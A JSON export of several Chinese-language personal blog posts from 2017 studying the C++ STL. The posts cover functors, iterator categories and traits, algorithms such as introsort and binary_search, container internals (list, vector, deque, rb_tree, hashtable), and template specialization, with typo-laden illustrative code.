functors","slug":"2017-04-03-仿函数","date":"2017-04-02T16:00:00.000Z","updated":"2018-02-18T03:29:06.038Z","comments":true,"path":"2017/04/03/2017-04-03-仿函数/","link":"","permalink":"http://coordinate.wang/2017/04/03/2017-04-03-仿函数/","excerpt":"","text":"仿函数functors123456789101112131415161718192021222324252627//算数类arithmetictemplate &lt;class T&gt;struct plus: public binary_function&lt;T, T, T&gt;&#123; T operator()( const T&amp; x, const T&amp; y) const &#123; return x + y; &#125;&#125;;template &lt;class T&gt;struct minus: public binary_function&lt; T, T,T&gt;&#123; T operator() (const T&amp; x,const T&amp; y) const &#123; return x - y; &#125;&#125;;//逻辑运算类logicaltemplate&lt;class T&gt;struct logical_and : public binary_function &lt;T, T, T&gt;&#123; bool operator()(const T&amp; x, const T&amp; y) const &#123; return x &amp;&amp; y; &#125;&#125;;//相对关系类relationaltemplate &lt;class T&gt;struct equal_to : public binary_function&lt;T , T, bool&gt;&#123; bool operator()(const T&amp; x, const T&amp; y) const &#123; return x == y; &#125;&#125;; Stl的仿函数都是继承一个类自己写的话也要这样做，才可以融入stl 1234567891011121314template &lt;class Arg, class Result&gt;struct unary_function&#123;//一个操作数，如对一个东西取非 typedef Arg argument_type; typedef Result result_type;&#125;;template &lt;class Arg1, class Arg2, class Result&gt;struct binary_function&#123; typedef Arg1 first_argument_type; typedef Arg2 second_argument_type; typedef Result result_type;&#125;; Stl规定每个adaptable function都应该挑选适当的继承。这种继承没有任何的坏处，他的空间没有变大。","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"stl","slug":"stl","permalink":"http://coordinate.wang/tags/stl/"},{"name":"仿函数","slug":"仿函数","permalink":"http://coordinate.wang/tags/仿函数/"}]},{"title":"迭代器 iterators","slug":"2017-04-02-迭代器","date":"2017-04-01T16:00:00.000Z","updated":"2018-02-18T03:29:06.021Z","comments":true,"path":"2017/04/02/2017-04-02-迭代器/","link":"","permalink":"http://coordinate.wang/2017/04/02/2017-04-02-迭代器/","excerpt":"","text":"迭代器的种类12345struct input_iterator_tag &#123;&#125;;struct output_iterator_tag &#123;&#125;;struct forword_iterator_tag :public input_iterator_tag &#123;&#125;;struct bidirectional_iterator_tag : public forward_iterator_tag &#123;&#125;;struct random_access_iterator_tag : public bidirectional_iterator_tag &#123;&#125;; 迭代器对算法的影响12345678910111213141516171819202122232425262728template&lt;class InputIterator&gt;inline iterator_traits&lt;InputIteartor&gt;::difference_type__distance(InputIterator first, InputIterator last, input_iterator_tag)&#123; iterator_traits&lt;InputIterator&gt;::difference_type n = 0; while(fisrt != last) &#123; ++first; ++n; ///数据量一大的话,这样效率会很低. &#125; return n;&#125;template&lt;class RandomAccessIterator&gt;inline iterator_traits&lt;RandomAccessIterator&gt;::difference_type__distance(RandomAccessIterator first, RandomAccessIterator last, random_access_iterator_tag)&#123; return last - first;&#125;template&lt;class InputIterator&gt;inline iterator_traits&lt;InputIterator&gt;::difference_typedistance(InputIterator first, InputIterator last)&#123; typedef typename //取出迭代器的分类 iterator_traits&lt;InputIterator&gt;;:iterator_category category; return __distance(first, last, category());&#125; 注意这里虽然只写了两种，但是由于前面图例的继承关系,所以是可以的 123456789101112131415161718192021222324252627282930313233343536temlplate&lt;class FI&gt;inline void destory(FI first, FI last)&#123; __destory(first, last, value_type(first));&#125;template&lt;class T&gt;inline void destory(T* pointer)&#123; pointer-&gt;~T(); &#125;template&lt;class Itr&gt;inline typename iterator_traits&lt;Itr&gt;::value_type*value_type(const Itr&amp;)&#123; return static_cast &lt;typename iterator_traits&lt;Itr&gt;::valur_type*&gt;(0);&#125;inline void destory(char *,char *)&#123;&#125;inline void destory(wchar *,wchar *)&#123;&#125;template &lt;class FI&gt;inline void __destory_aux(FI, FI,__true_type)&#123;&#125;template &lt;class FI&gt;inline void __destory__aux(FI first,FI last, __false_type)&#123; for(; first &lt;last; ++first) destory(&amp;*first);&#125;template&lt;class FI,class T&gt;inline void __destory(FI first, FI last, T*)&#123; typedef typename __type_traits&lt;T&gt;::has_trivial_destructor trivial_destructor; __destory_aux(first,last, trivial_destructor());&#125; 算法源码中对于迭代器的分类的暗示，没有强制要求 123456789101112131415161718template &lt;class InputIterator&gt;inline iterator_traits&lt;InputIterator&gt;::difference_typedistance (InputIterator first, InputIterator last)&#123; typedef typename iterator_traits&lt;InputIterator&gt;::iterator_category category; return __distance(first, last, category());&#125;template &lt;class RandomAccessIterator&gt;inline void sort(RandomAccessIterator first, RandomAccessIterator last)&#123; if(first != last) &#123; __introsort_loop(first, last, value_type(first), __lg(last-first) * 2); __final_insertion_sort(first, last); &#125;&#125; 关于reverse iterator，rbegin()，rend 123456reverse_iteratorrbegin()&#123; return reverse_iterator(end()); &#125;//用了iterator adapterreverse_iteratorrend()&#123; return reverse_iterator(begin()); &#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"stl","slug":"stl","permalink":"http://coordinate.wang/tags/stl/"},{"name":"迭代器","slug":"迭代器","permalink":"http://coordinate.wang/tags/迭代器/"}]},{"title":"算法 algorithms","slug":"2017-04-01-算法","date":"2017-03-31T16:00:00.000Z","updated":"2018-02-18T03:29:06.006Z","comments":true,"path":"2017/04/01/2017-04-01-算法/","link":"","permalink":"http://coordinate.wang/2017/04/01/2017-04-01-算法/","excerpt":"","text":"Algorithm 看不见containers，所以他需要的一切信息都必须从iterators取得，而iterators必须回答algorithm的所有问题，才能搭配这个algorithm的所有操作，可以看最前面的一个图。从语言层面看，algorithm是一个function template 算法accumulate12345678910111213141516171819202122232425template &lt;class InputIterator, class T&gt;T accumulate (InputIterator first, InputIterator last, T init)&#123; for( ; first != last; ++first)//将元素累加至初值init身上 init = init + *first; return init;&#125;通常算法有两个版本，另一个允许增加函数template &lt;class InputIterator, class T, class BinaryOperation&gt;T accumulate(InputIterator first, InputIterator last, T init, BinaryOperation binary)&#123; for( ; first != last; ++first)//将元素累加至初值init身上 init = binary_op(init, *first); return init;&#125; 算法for_each12345678910111213141516template &lt;class InputIterator, class Function&gt;Function for_each(InputIterator first, InputIterator last, Function f)&#123; for( ; first != last ; ++first) f(*first); return f;&#125;range-based for statementsince c++11for( decl : coll )&#123; statement&#125; 算法replace，replace_if，replace_copy123456789101112131415161718192021222324252627282930313233关于算法的命名规则template &lt;class ForwardIterator, class T&gt;void replace (ForwardIterator first, ForwardIterator last, const T&amp; old_value, const T&amp; new_value)&#123; for( ;first != last; ++first) if(*first == old_value) *first = new_value;&#125;template &lt;class InputIterator, class OutputIterator, class T&gt;OutputIterator replace_copy(InputIterator first, InputIterator last, OutputIterator result, const T&amp; old_value, const T&amp; new_value)//等于old_value的都以new_value放入新的存储空间&#123; for(; fisrt != last; ++first, ++result) *result = *first == old_value? new_value:*first; return result;&#125;template &lt;class ForwardIterator,class Predicate, class T&gt;void replace_if(ForwardIterator first, ForwardIterator last, predicate pred, const T&amp; new_value)&#123; for (; first != last ; ++first) if(pred(*first)) *first = new_value;&#125; 算法count，count_if12345678910111213141516171819202122template &lt;class InputIterator, class T&gt;typename iterator_traits&lt;InputIterator&gt;::difference_typecount(InputIterator first, InputIterator last, const T&amp; value)&#123; typename iterator_traits&lt;InputIterator&gt;::difference_type n = 0; for(; first != last; ++first) if(*first == value) ++n; return n;&#125;template &lt;class InputIterator, class Predicate&gt;typename iterator_traits&lt;InputIterator&gt;::difference_typecount_if( InputIterator first, InputIterator last, Predicate pred)&#123; typename iterator_traits&lt;InputIterator&gt;::difference_type n = 0; for( ; first != last; ++first) if(pred(*first)) ++n; return n;&#125; 容器不带成员函数count()array，vector，list，forward_list，deque 容器带有成员函数set/mutisetmap/mutimapunordered_set/unordered_mutisetunordered_map/unordered_mutimap 算法find，find_if1234567891011121314151617181920template &lt;class InputIterator, class T&gt;InputIterator find(InputIterator first, InputIterator last, const T&amp; value)&#123; while(first != last &amp;&amp; *first != value) ++first; return first;&#125;template &lt;class InputIterator, class Precidate&gt;InputIterator find(InputIterator first, InputIterator last, Predicate pred)&#123; while( first != last &amp;&amp; !pred(*first)) &#123; ++first; &#125; return first;&#125; 容器不带成员函数find()array，vector，list，forward_list，deque 容器带有成员函数set/mutisetmap/mutimapunordered_set/unordered_mutisetunordered_map/unordered_mutimap 算法sortSTL中的sort并非只是普通的快速排序，除了对普通的快速排序进行优化，它还结合了插入排序和堆排序。根据不同的数量级别以及不同情况，能自动选用合适的排序方法。当数据量较大时采用快速排序，分段递归。一旦分段后的数据量小于某个阀值，为避免递归调用带来过大的额外负荷，便会改用插入排序。而如果递归层次过深，有出现最坏情况的倾向，还会改用堆排序。 12345678910111213141516171819202122232425262728293031323334353637383940414243template &lt;class _RandomAccessIter&gt;inline void sort(_RandomAccessIter __first, _RandomAccessIter __last) &#123; __STL_REQUIRES(_RandomAccessIter, _Mutable_RandomAccessIterator); __STL_REQUIRES(typename iterator_traits&lt;_RandomAccessIter&gt;::value_type, _LessThanComparable); if (__first != __last) &#123; __introsort_loop(__first, __last, __VALUE_TYPE(__first), __lg(__last - __first) * 2); __final_insertion_sort(__first, __last); &#125;&#125;template &lt;class Size&gt;inline Size __lg(Size n) &#123; Size k; for (k = 0; n &gt; 1; n &gt;&gt;= 1) ++k; return k;&#125;template &lt;class _RandomAccessIter, class _Tp, class _Size&gt;void __introsort_loop(_RandomAccessIter __first, _RandomAccessIter __last, _Tp*, _Size __depth_limit)&#123; while (__last - __first &gt; __stl_threshold) &#123; if (__depth_limit == 0) &#123; partial_sort(__first, __last, __last); return; &#125; --__depth_limit; _RandomAccessIter __cut = __unguarded_partition(__first, __last, _Tp(__median(*__first, *(__first + (__last - __first)/2), *(__last - 1)))); __introsort_loop(__cut, __last, (_Tp*) 0, __depth_limit); __last = __cut; &#125;&#125; 首先判断元素规模是否大于阀值stl_threshold，stl_threshold是一个常整形的全局变量，值为16，表示若元素规模小于等于16，则结束内省式排序算法，返回sort函数，改用插入排序。若元素规模大于stl_threshold，则判断递归调用深度是否超过限制。若已经到达最大限制层次的递归调用，则改用堆排序。代码中的partial_sort即用堆排序实现。若没有超过递归调用深度，则调用函数unguarded_partition()对当前元素做一趟快速排序，并返回枢轴位置。__unguarded_partition()函数采用的便是上面所讲的使用两个迭代器的方法，代码如下 123456789101112131415161718template &lt;class _RandomAccessIter, class _Tp&gt;_RandomAccessIter __unguarded_partition(_RandomAccessIter __first, _RandomAccessIter __last, _Tp __pivot) &#123; while (true) &#123; while (*__first &lt; __pivot) ++__first; --__last; while (__pivot &lt; *__last) --__last; if (!(__first &lt; __last)) return __first; iter_swap(__first, __last); ++__first; &#125;&#125; 经过一趟快速排序后，再递归对右半部分调用内省式排序算法。然后回到while循环，对左半部分进行排序。源码写法和我们一般的写法不同，但原理是一样的，需要注意。 容器不带成员函数sort()array，vector，deque 以下四个默认排好了set/mutisetmap/mutimapunordered_set/unordered_mutisetunordered_map/unordered_mutimap 容器带有成员函数list，forward_list 算法binary_search123456789101112131415161718192021222324252627282930313233Test if value exits in sorted sequencetemplate &lt;class ForwardIterator, class T&gt;bool binary_search( ForwardIterator first, ForwardIterator last, const T&amp; val)&#123; first = std::lower_bound(first, last, val);//获得的iterator所指的位置，既非end，目标val也不是小于首元素 return (first != last &amp;&amp; !(val &lt;*first));&#125;在lower_bound之前做一次!(val &lt;*first)会更好template &lt;class ForwardIterator, class T&gt;ForwardIterator lower_bound(ForwardIterator first, ForwardIterator last, const T&amp; val)&#123; ForwardIterator it; iterator_traits&lt;ForwardIterator&gt;::difference_type count,step; count = distance(first, last); while(count &gt; 0) &#123; it = first;step = count /2; if(*it &lt;val) &#123; first = ++it; count -= step +1; &#125; else count = step; &#125; return first;&#125; 关于lower_bound表示的是一个排好的序列里，相同的value的最低点，而upper_bound则相反。","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"stl","slug":"stl","permalink":"http://coordinate.wang/tags/stl/"},{"name":"算法","slug":"算法","permalink":"http://coordinate.wang/tags/算法/"}]},{"title":"容器 containers","slug":"2017-03-31-容器","date":"2017-03-30T16:00:00.000Z","updated":"2018-02-18T03:29:06.006Z","comments":true,"path":"2017/03/31/2017-03-31-容器/","link":"","permalink":"http://coordinate.wang/2017/03/31/2017-03-31-容器/","excerpt":"","text":"stl 六大部件 容器containers12345678910111213141516前闭后开区间Begin指向第一个元素，end指向最后一个元素的下一个元素Container&lt;T&gt; c;...Container&lt;T&gt;::iterator ite = c.begin();for(; ite != c.end(); ite++)...Ranged-based for statement c++11And auto keywordfor( decl : coll) &#123; statement &#125;std::vector&lt;double&gt; vec;for( auto elem : vec )&#123; std::cout &lt;&lt; elem &lt;&lt; std::endl; &#125;for( auto&amp; elem : vec )&#123; elem *= 3; &#125; Associative containers 使用红黑树Unordered containers 哈希表separate chaining,注意对于vector 和list，forword list用其自带的排序，而对于deque使用全局的排序queue和stack内部使用了deque，而且他们的内部都不会提供iterator 在c++11中，slist名为forward_list，hash_set，hash_map名为unordered_set，unordered_man，hash_mutiset，hash_mutimap名为unordered_mutiset，unordered_multimap 容器list123456789101112131415161718192021222324252627282930313233343536373839404142是一个环形双向链表template &lt;class T&gt;struct __list_node&#123; typedef void* void_pointer; void_pointer prev; void_pointer next; T data;&#125;template &lt;class T, class Alloc = alloc&gt;class list&#123;protected: typedef __list_node&lt;T&gt; list_node;public: typedef list_node* link_type; typedef __list_iterator&lt;T, T&amp;, T*&gt; iterator;protected: link_type node; ...&#125;;template &lt;class T, class Ref, class Ptr&gt;struct __list_iterator&#123; typedef __list_iterator&lt;T, Ref, Ptr&gt; self; typedef bidirectional_iterator_tag iterator_category; typedef T value_type; typedef Ptr pointer; typedef Ref reference; typedef __list_node&lt;T&gt;* link_type; typedef ptrdiff_t difference_type; link_type node; reference operator*() const &#123; return (*node).data; &#125; pointer operator-&gt;() const &#123; return &amp;(operator*()); &#125; self &amp;operator++() //prefix &#123; node = (link_type)((*node).next); return *this; &#125; self operator++(int) //postfix&#123; self tmp = *this; ++*this; return tmp; &#125; ...&#125;; 如果iterator不是一个类的话，那他的内部就不可以使用typedef，例如指针，指针不是一个类，但指针是一种退化的iterator。所以传给算法的时候，有可能是一个指针而不是迭代器 1234567891011template &lt;typename T&gt;inline void algorithm (T first, T last)&#123; T::iterator_category; T::pointer; T::reference; T::value_type; T::difference_type; ...&#125;; 这个时候就引入了traits萃取机 Taits 特性Iterator traits用以分离class iterators和non-class iterators,这个traits机器不许有分辨iterator是一个class iterator T或是一个native pointer to T 12345678910111213141516171819202122232425//to classtemplate &lt;class T&gt;struct iterator_tarits&#123; typedef typename T::value_type value_type;&#125;;//to pointerPartial specialization 偏特化template &lt;class T&gt;struct iterator_traits&lt;T*&gt;&#123; typedef T value_type;&#125;;template &lt;class T&gt;struct iterator_traits&lt;const T*&gt;&#123; typedef T value_type;//这里是T不是const T//如果是const 那他就不能被赋值，那就没有用了&#125;;//于是但需要知道value type，这样写template &lt;typename T,...&gt;void algorithm(...)&#123; typename iterator_taits&lt;T&gt;::value_type v1;&#125;; 容器vector如果空间不够的话，需要向操作系统寻求两倍大的空间。 1234567891011121314151617181920212223242526272829303132template &lt;class T, class Alloc = alloc&gt;class vector&#123;public: typedef T value_type; typedef value_type* iterator; typedef value_type&amp; reference; typedef size_t size_type;protected: iterator start; iterator finish;//实际大小 iterator end_of_storage;//理论大小public: iterator begin() &#123; return start; &#125; iterator end() &#123; return finish; &#125; size_type size() const &#123; return size_type( end() - begin()); &#125;//这样确定size永远不会改变 size_type capacity() const &#123; return size_type( end_of_storge - begin()); &#125; bool empty() const &#123; return beign() == end(); &#125; ...&#125;;Vector’s iteratortemplate &lt;class T,class Alloc = alloc&gt;class vector&#123;public: typedef T value_type; typedef value_type *iterator; ...&#125;; 使用的是指针萃取机 容器array12345678910111213141516template &lt;typename _Tp, std::size_t _Nm&gt;struct array&#123; typedef _Tp value_type; typedef _Tp* pointer; typedef value_type* iterator; value_type _M_instance[_Nm ? _Nm : 1 ]; iterator begin() &#123; return iterator(&amp; _M_instance[0]; &#125; iterator end() &#123; return iterator(&amp;_M_instance[_Nm]; &#125; ...&#125; 没有构造和析构使用必须指定大小，因为她不可扩充 1234array&lt;int,10&gt; myArray;auto ite = myArray.begin();ite += 3;cout &lt;&lt; *ite; 使用的是指针萃取机 容器deque双向开口的空间 每个vector里面是一个指针，内存不够的话，分配一个buf，让指针指向buf 12345678910111213141516171819202122232425262728293031323334353637383940414243inline size_t __deque_buf_size(size_t n, size_t sz)&#123; return n != 0 ? n : (sz &lt; 512? size_t(512 /sz) :size_t(1);&#125;;template &lt;class T, class Alloc = alloc, size_t BufSiz = 0&gt;//如果是0使用默认设置，如果不是，使用上面的算式class deque&#123;public: typedef T value_type; typedef __deque_iterator&lt;T, T&amp;, T*, BufSize&gt; iteartor;protected: typedef pointer *map_pointer;protected: iterator start; iterator finish; map_pointer map; size_type map_size;public: iterator begin() &#123; return start; &#125; iterator end() &#123; return finish; &#125; size_type size() const &#123; return finish - start; &#125; ...&#125;;deque’s iteratortemplate &lt;class T, class Ref, class Ptr, size_t BufSiz&gt;struct __deque_iterator&#123; typedef random_access_iterator_tag iterator_category;//注意这里random typedef T value_type; typedef Ptr pointer; typedef Ref reference; typedef size_t size_type; typedef ptrdiff_t difference_type; typedef T** map_pointer; typedef __deque_iterator self; T* cur; T* first; T* last; map_pointer node; ...&#125;; Deque是如何模拟连续空间的 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970reference operator[](size_type n)&#123; return start[difference_type(n)];&#125;reference front()&#123; return *start;&#125;reference back()&#123; iterator tmp = finish; --tmp; return *tmp;&#125;size_type size() const&#123; return finish - start;&#125;bool empty() const&#123; return finish == start;&#125;reference operator*() const&#123; return *cur; &#125;pointer opertor-&gt;() const&#123; return &amp;(operator*()); &#125;difference_typeoperator-(const self&amp; x) const&#123; return difference_type(buffer_size()) * (node - x.node - 1) + (cur - first) + (x.last - x.cur );&#125;self&amp; operator++()&#123; ++cur; if(cur == last) &#123; set_node(node + 1); cur = first; &#125; return *this;&#125;self operator++(int)&#123; self tmp = *this; ++*this; return tmp;&#125;self&amp; operator--()&#123; if(cur == last) &#123; set_node(node - 1); cur = last; &#125; --cur; return *this;&#125;self operator--(int)&#123; self tmp = *this; --*this; return tmp;&#125;void set_node(map_pointer new_node)&#123; node = new_node; first = *new_node; last = first + difference_type(buffer_size());&#125; 容器queue，stack就是变相的deque，deque是双进双出，stack先进后出，queue先进先出Stack和queue都可以选择list或queue 12stack&lt;string, list&lt;string&gt;&gt; c;stack&lt;string&gt; c;//默认是deque Stack或queue都不允许遍历，所以也就不提供iteratorStack可以选择vector作为底部结构，但是queue不可以Stack与queue都不可以使用set或map作为底部支撑 容器rb_tree红黑数是平衡二叉树中的常用的一种平衡二叉树的特征：配列规则有利search和insert，并保持适度平衡。我们不应使用rb_tree的iterators改变元素值。变成层面并未阻绝此事。因为rb_tree即将为set和map服务，而map允许元素的data被改变，只有元素的key才是不可被改编的。Rb_tree提供两种insertion操作：insert_unique和insert_equal。前者表示节点的key一定是整个tree中独一无二的，后者便是节点的key可重复。 12345678910111213141516171819template &lt;class Key, //key的类型 class Value,//value是data和key一起，这里指value的类型 class KeyOfValue, //key要怎么取出 class Compare, //key怎么比大小 class Alloc = alloc&gt;class rb_tree&#123;protected: typedef __rb_tree_node&lt;Value&gt; rb_tree_node; ...public: typedef rb_tree_node *link_type; ...protected: size_type node_count; link_type header; Compare key_compare; ...&#125;; 用法 123456789101112131415161718192021222324252627282930rb_tree&lt;int, //key的类型 int, //value的类型 identity&lt;int&gt;, //注意这个gc下的，但是可以自己写 less&lt;int&gt; alloc&gt;myTree;template &lt;class Arg, class Result&gt;struct unary_function&#123; typedef Arg argument_type; typedef Result result_type;&#125;;template &lt;class T&gt;struct identity: public unary_function&lt;T, T&gt;&#123; const T&amp; operator() (const T&amp; x) const &#123; return x; &#125;&#125;;template &lt;class Arg1, class Arg2, class Result&gt;struct binary_function&#123; tyepdef Arg1 first_argument_type; typedef Arg2 second_argument_type; typedef Result result_type;&#125;;template&lt;class T&gt;struct less : public binary_function&lt;T, T, bool&gt;&#123; bool operator()(const T&amp; x, const T&amp; y) const &#123; return x &lt; y; &#125;&#125;; 注意没有必要这样做，只是为了更加了解内部原理 容器set、mutiset以rb_tree为底层结构，因此有元素自动排序特性。排序的依据是key，而set/mutiset元素的value和key合一：value就是keySet/mutiset提供遍历操作及iterators我们无法使用set/mutiset的iterators改变元素值。Set/mutiset的iterator是其底部的re_tree的const iterator，就是为了禁止user对其赋值。Set元素的key必须是独一无二的，因此insert用的rb_tree的insert_unique。Mutiset元素的key可以重复，因此insert用的是rb_tree的insert_equal 123456789101112131415161718template&lt; class Key, class Compare = less&lt;Key&gt;, class Alloc = alloc&gt;class set&#123;public: typedef Key key_type; typedef Key value_type; typedef Compare key_compare; typedef Compare value_compare;private: typedef rb_tree&lt;key_type, value_type, identity&lt;value_type&gt;, key_compare, Alloc&gt; rep_type; rep_type t;public: typedef typename rep_type ::const_iterator iterator; ...&#125;; 容器map，mutimapMap/mutimap以rb_tree为底层结构，因此有元素自动排序的特性，排序的依据是keySet/mutiset提供遍历操作及iterators我们无法使用map/mutimap的iterators改变元素的key但可以改变data。因此map/mutimap内部自动将user指定的keytype设为const，如此便能禁止user对元素的key赋值。map元素的key必须是独一无二的，因此insert用的rb_tree的insert_unique。mutimap元素的key可以重复，因此insert用的是rb_tree的insert_equal 1234567891011121314151617181920template &lt; class Key, class T, class Compare = less&lt;Key&gt;, class Alloc = alloc&gt;class map&#123;public: typedef Key key_type; typedef T data_type; typedef T mapped_type; typedef pair&lt;const Key, T&gt; value_type;//注意这里将data和key合成为value typedef Compare key_compare;private: typedef rb_tree&lt;key_type, value_type, select1st&lt;value_type&gt;, key_compare, Alloc&gt; rep_type; rep_type t;public: typedef typename rep_type::iterator iterator; ...&#125;; 在mutimap中不可以用[]做insert，必需使用insert在map中可以Allow for easy lookup with the subscript(@c[])operator.Returns data associated with the key specified subscript.If the key does not exit, a pair with that key is created using default values, which is then returned. 123456789101112mapped_type&amp;operator[](const key_type&amp; __k)&#123; iterator __i = lower_bound(__k); if(__i == end() || key_comp()(__k, (*__i).first))#if __cpluscplus &gt;= 201103L __i = M_t....#else __i = insert(__i, value_type(__k, mapped_type()));#endif return (*__i).second;&#125; lower_bound是二分查找，在sorted[first, last)中查找元素value，找到返回一个iterator指向其中的第一个元素。如果没有这样的元素存在，他就会传回最适合按插这个key的iterator。但是可以从源代码中看出，使用[]后速度变慢了，调用了lower_bound 容器hashtable 如果多个元素放在同一个位置就会发生碰撞，但是如果采用移动位置的方式就会降低效率，最后的方法是，每一个节点做一个链表，把碰撞的元素放入链表中，也就是separate chaining。但是这样做的话，可能会出现单一链表过长，所以就出现了buckets。如果按插的元素个数大于buckets个数，于是rehashing，所有的元素要重新按插，这是一件花时间的事情。buckets的数目是按照素数来的。 123456789101112131415161718192021222324252627282930313233343536template &lt;class Value, class Key, class HashFcn,//HashFcn计算hashcode class ExtractKey, class EqualKey,//ExtractKey取出key的方法 class Alloc = alloc&gt;class hashtable&#123;public: typedef HashFcn hasher; typedef EqualKey key_equal; typedef size_t size_type;private: hasher hash; key_equal equals; ExtractKey get_key; typedef __hashtable_node&lt;Value&gt; node; vector&lt;node*, Alloc&gt; buckets; size_type num_elements;public: size_type bucket_count() const &#123; return buckets.size(); &#125; ...&#125;;template &lt;class Value, class Key, class HashFcn, class ExtractKey, class EqualKey, class Alloc&gt;struct __hashtable_iterator&#123; ... node *cur;//指向节点 hashtable *ht;//指向buckets，这样做和前面的deque做法类似&#125;;template &lt;class Value&gt;struct __hashtable_node&#123; __hashtable_node *next;//这个是gc的版本，在vc下面时双向链表 Value val;&#125; 用法 1234567891011121314151617181920212223hashtable&lt;const char *, const char *, hash&lt;const char *&gt;, identity&lt;const char *&gt;, eqstr, alloc&gt;ht(50, hash&lt;const char *&gt;(), eqstr());ht.insert_unique(\"fjds\");struct eqstr&#123; bool operator()(const char *s1,const char *s2) const &#123; return strcmp(s1,s2) == 0;//注意strcmp有三种返回值-1，0，1，C/C++函数，比较两个字符串，//设这两个字符串为str1，str2，若str1==str2，则返回零；若//str1&lt;str2，则返回负数；若str1&gt;str2，则返回正数。 &#125;&#125;template &lt;class Key &gt; struct hash &#123;&#125;;//泛化_STL_TEMPLATE_NULL struct hash&lt;char&gt;//特化&#123; size_t operator() (char x) const &#123; return x; &#125;&#125; ..数值型 1234567891011inline size_t __stl_hash_string(const char * s)&#123; unsigned long h = 0; for(; *s; ++s) h = h*5 + *s; return size_t(h);&#125;__STL_TEMPLATE_NULL struct hash&lt;char *&gt;//特化&#123; size_t operator() (const char *s ) const &#123; return __stl_hash_string(s); &#125;&#125; ..字符串型但是不是c++的stringHash_function的目的就是希望根据元素值算出一个hash code，使得元素经hash code映射后可以得到一个唯一值放入hashtable中。 12345678910111213141516171819202122232425iterator find(const key_type &amp;key)&#123; size_type n = bkt_num_key(key);...&#125;size_typebkt_num_key(const key_type&amp; key) const&#123; return bkt_num_key(key, buckets.size());&#125;size_typebkt_num(const value_type &amp;obj) const&#123; return bkt_num_key(get_key(obj));&#125;;size_typebkt_num_key(const key_type &amp;key, size_t n) const&#123; return hash(key)%n;&#125; size_typebkt_num(const value_type&amp; obj, size_t n)const&#123; return bkt_num_key(get_key(obj) n);&#125; Before c++11Hash_setHash_mutisetHash_mapHash_mutimap Since c++11Unordered_setUnordered_multisetUnordered_mapUnordered_multimap","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"stl","slug":"stl","permalink":"http://coordinate.wang/tags/stl/"}]},{"title":"再看c++","slug":"2017-03-29-再看c++","date":"2017-03-28T16:00:00.000Z","updated":"2018-02-18T03:29:06.004Z","comments":true,"path":"2017/03/29/2017-03-29-再看c++/","link":"","permalink":"http://coordinate.wang/2017/03/29/2017-03-29-再看c++/","excerpt":"","text":"未解决的一些问题Specialization特化1234567template &lt;class Key&gt;struct hash&#123;&#125;;template&lt;&gt;struct hash&lt;char&gt;&#123; size_t operator() (char x) const &#123; return x; &#125;&#125;; 有时为了需要,针对特定的类型,需要对模板进行特化,也就是特殊处理.例如,stack类模板针对bool类型,因为实际上bool类型只需要一个二进制位，就可以对其进行存储,使用一个字或者一个字节都是浪费存储空间的. Partial Specialization偏特化个数上 12345678Template&lt;typename T, typename Alloc=…&gt;Class vector&#123; …&#125;;template&lt;typename Alloc=…&gt;class vector&lt;bool, Alloc&gt; //语法上只允许从左到右的具体化&#123;…&#125; 范围上 123456789101112template &lt;typename T&gt;class C&#123; …&#125;;template &lt;typename T&gt;class C &lt;T*&gt;&#123; …&#125;;C&lt;string&gt; obj1;C&lt;string*&gt; obj2; Template template parameter 模板模板参数12345678910template&lt;typename T,template &lt;typename T&gt; class Container&gt;class XCLSs&#123;private: container&lt;t&gt; c;public:&#125;;template&lt;typename T&gt;using Lst = list&lt;T ,allocator&lt;T&gt;&gt;;XCLs&lt;string, Lst&gt; mylst2; 以下做法是错误的 1XCLs&lt;string, list&gt; mylst1; 原因在于容器可以接受多个参数 注意只有这个地方typename class 可以共通 123456789template&lt;typename T,template &lt;typename T&gt; class SmartPtr&gt;class XCLSs&#123;private: SmartPtr&lt;T&gt; c;public: XCLs() : sp(new T) &#123;&#125;&#125;;XCLs&lt;string , shared_ptr&gt; p1; //只接收一个参数 以下这种写法不再是ttp 12345template&lt;class T, class Sequence = deque&lt;T&gt;&gt;class stack&#123;&#125;;stack&lt;int&gt; s1;stack&lt;int, list&lt;int&gt;&gt; s2; c++标准库仿函数functors算法algorithms迭代器iterators容器containers variadic templates c++111234567template&lt;typename T,typename… Types&gt;//注意这里的。。。是语法void print(const T&amp; firstArg, const Type&amp;… args)&#123; cout &lt;&lt; firstArg &lt;&lt;endl; print(args…);&#125;;print(7.5, “hello”, bitset&lt;16&gt;(377), 42); 。。。就是一个packauto c++11 123list&lt;string&gt; c;list&lt;string&gt;::iterator ite;ite = find(c.begin(), c.end(), target); 变成了auto ite = find(c.begin(), c.end(), target);这种做法是错误的 12auto ite; //编译器推不出来ite = ….; ranged-base for(c++11)1234567891011121314for(del : coll)&#123; Statement&#125;例子for(int I : &#123; 2,3,5,6&#125;)&#123; cout &lt;&lt; I &lt;&lt;endl;&#125;vector&lt;double&gt; vec;for(auto elem : vec)&#123; cout &lt;&lt; elem &lt;&lt; endl;&#125; reference123456int x = 0;int *p = &amp;x;int &amp;r = x; //r代表xint x2 = 5;r = x2; //r不能重新代表其他物体int &amp;r2 = r;// 一定要有初值，设好后，不可以再变化object和其reference大小相同，地址也相同，但这是假像以下视为same signature 12double image(const double&amp; im) &#123;&#125;double image(const double im) &#123;&#125; 包括括号后面的部分（const）都是签名 12double image(const double&amp; im) const&#123;&#125;double image(const double im) &#123;&#125;] 这样表示的函数不同 Object model关于vptr和vtbl 1234567891011121314151617181920212223242526class A&#123;public: virtual void vfunc1(); virtual void vfunc2(); void func1(); void func2();private: int m_data1, m_data2;&#125;;class B: public A&#123;public: virtual void vfunc1(); void func2();private: int m_data3;&#125;;class C: public B&#123;public: virtual void vfunc1(); void func2();private: int m_data1, m_data4;&#125;; 通过指针向上转型，调用虚函数，把这个调用动作编译为(*p-&gt;vptr[n]) (p)动态绑定Dynamic Binding 